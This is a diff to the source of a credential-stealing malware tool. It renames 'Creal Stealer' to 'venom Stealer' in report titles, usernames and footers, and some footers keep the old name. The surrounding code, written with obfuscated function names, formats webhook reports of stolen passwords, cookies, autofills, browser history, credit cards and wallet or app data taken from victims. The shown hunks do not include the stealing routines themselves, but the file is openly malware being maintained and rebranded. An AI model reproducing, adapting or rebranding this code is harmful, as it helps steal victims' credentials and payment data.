@@ -513,16 +513,16 @@ def UP104D(name, link):
             "content": GLINFO,
             "embeds": [
                 {
-               "title": f"Creal Stealer | Data Extractor",
+               "title": f"venom Stealer | Data Extractor",
                 "color": 2895667,
                 "fields": link,
                 "footer": {
-                    "text": f"Creal Stealer",
+                    "text": f"venom Stealer",
                     "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                 },
                 }
             ],
-            "username": f"Creal Stealer",
+            "username": f"venom Stealer",
             "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
             "attachments": []
             }
@@ -547,14 +547,14 @@ def UP104D(name, link):
                 {
                 "color": 2895667,
                 "fields": endlist,
-                "title": f"Creal Stealer | File Stealer",
+                "title": f"venom Stealer | File Stealer",
                 "footer": {
                     "text": f"Creal Stealer",
                     "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                 }
                 }
             ],
-            "username": f"Creal Stealer",
+            "username": f"venom Stealer",
             "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
             "attachments": []
             }
@@ -775,28 +775,28 @@ def G378r0W53r5(br0W53rP47H5):
         "content": GLINFO,
         "embeds": [
             {
-                "title": f"Creal Stealer | Password Stealer",
+                "title": f"venom Stealer | Password Stealer",
                 "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPasswords.txt]({filess[0]})",
                 "color": 2895667,
-                "footer": {"text": f"Creal Stealer",  
+                "footer": {"text": f"venom Stealer",  
                 "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"}
             },
             {
-                "title": f"Creal Stealer | Cookies Stealer",
+                "title": f"venom Stealer | Cookies Stealer",
                 "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({filess[1]})",
                 "color": 2895667,
-                "footer": {"text": f"Creal Stealer",  
+                "footer": {"text": f"venom Stealer",  
                 "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"}
             },
             {
-                "title": f"Creal Stealer | Browser Data",
+                "title": f"venom Stealer | Browser Data",
                 "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealBookmarks.txt]({filess[5]})",
                 "color": 2895667,
                 "footer": {"text": f"Creal Stealer",  
                 "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"}
             }
         ],
-        "username": f"Creal Stealer",
+        "username": f"venom Stealer",
         "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
         "attachments": []
     }
@@ -865,7 +865,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "content": GLINFO,
         "embeds": [
             {
-            "title": f"Creal Stealer | App Stealer",
+            "title": f"venom Stealer | App Stealer",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
@@ -874,7 +874,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             }
             }
         ],
-        "username": f"Creal Stealer",
+        "username": f"venom Stealer",
         "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
         "attachments": []
     }
